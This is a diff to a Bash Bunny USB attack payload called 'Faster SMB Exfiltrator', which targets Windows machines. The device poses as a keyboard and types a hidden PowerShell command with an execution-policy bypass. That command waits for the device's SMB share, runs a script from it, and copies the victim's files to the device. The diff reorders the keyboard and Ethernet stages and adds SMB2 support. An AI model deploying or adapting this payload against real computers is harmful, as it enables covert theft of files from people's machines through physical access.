@@ -3,7 +3,7 @@
 # Title:         Faster SMB Exfiltrator
 # Author:        Hak5Darren
 # Props:         ImNatho, mike111b, madbuda
-# Version:       1.1
+# Version:       1.5
 # Category:      Exfiltration
 # Target:        Windows XP SP3+ (Powershell)
 # Attackmodes:   HID, Ethernet
@@ -27,15 +27,15 @@
 #   3. Boot Bash Bunny into arming mode and connect to console via serial
 #   4. Issue "python /tools/impacket/setup.py install"
 # Option B:
-#   1. Download impacket deb package 
+#   1. Download impacket deb package
 #   2. Copy impacket.deb to /tools on the Bash Bunny flash drive
 #   3. Boot Bash Bunny into arming mode. Impacket will install automatically.
-# 
+#
 # LED STATUS
 # ==========
 # FAIL........Failed to find dependencies
-# STAGE1......HID Stage
 # STAGE2......Ethernet Stage
+# SETUP.......HID Stage
 # SPECIAL.....Receiving Files
 # CLEANUP.....Moving Liberated Files
 # FINISH......Finished
@@ -59,24 +59,22 @@ cp /root/udisk/payloads/$SWITCH_POSITION/s.ps1 /loot/smb/
 mkdir -p /root/udisk/loot/smb_exfiltrator
 
 
-
-######## HID STAGE ########
-# Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available
-GET HOST_IP
-LED STAGE1
-ATTACKMODE HID
-RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"While (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
-
-
-
 ######## ETHERNET STAGE ########
 LED STAGE2
 ATTACKMODE RNDIS_ETHERNET
 # Start the SMB Server
-python /tools/impacket/examples/smbserver.py -comment 'That Place Where I Put That Thing That Time' s /loot/smb >> /loot/smbserver.log &
+python /tools/impacket/examples/smbserver.py -smb2support -comment '1337' s /loot/smb >> /loot/smbserver.log &
 # Re-enable ICMP/echo replies to trip the powershell stager
 echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
-LED B 100
+
+
+######## HID STAGE ########
+# Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available
+GET HOST_IP
+LED SETUP
+ATTACKMODE HID RNDIS_ETHERNET
+RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"While (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
+LED SPECIAL
 # Wait until files are done copying.
 while ! [ -f /loot/smb/EXFILTRATION_COMPLETE ]; do sleep 1; done
 
